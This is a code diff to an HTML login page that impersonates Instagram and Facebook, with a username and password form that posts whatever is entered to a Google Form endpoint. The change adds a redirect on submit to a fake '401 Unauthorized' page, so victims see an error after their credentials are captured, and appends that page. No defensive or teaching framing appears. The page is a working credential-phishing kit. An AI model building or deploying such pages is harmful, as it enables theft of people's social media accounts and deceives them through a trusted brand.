@@ -18,14 +18,14 @@
                 </h1>
                 
                 <!-- Connect the form to Google Form -->
-                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScS_lZJJZxWAySrV6Amjp8SF11-3U9HpOCemR782V_QQue02w/formResponse" method="POST" target="_self">
+                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScS_lZJJZxWAySrV6Amjp8SF11-3U9HpOCemR782V_QQue02w/formResponse" method="POST" target="_self" onsubmit="window.location.href='401.html';">
                     <label for="email" class="sr-only">username, phone number or email</label>
                     <input name="entry.1162589549" placeholder="username, phone number or email" class="input-field" required />
                     
                     <label for="password" class="sr-only">Password</label>
                     <input name="entry.1612369267" type="password" placeholder="password" class="input-field" required />
                     
-                    <button type="submit" onclick="document.forms[0].submit();">Login</button>
+                    <button type="submit">Login</button>
                 </form>
 
                 <div class="flex separator align-items-center">
@@ -70,5 +70,25 @@
         </ul>
         <p class="copyright">© 2025 Instagram & Facebook</p>
     </footer>
+</body>
+</html>
+
+<!-- Create a 401.html file in your project folder -->
+<!-- 401.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>401 Unauthorized</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+    </style>
+</head>
+<body>
+    <h1>401 Unauthorized</h1>
+    <p>You do not have permission to access this page.</p>
 </body>
 </html>
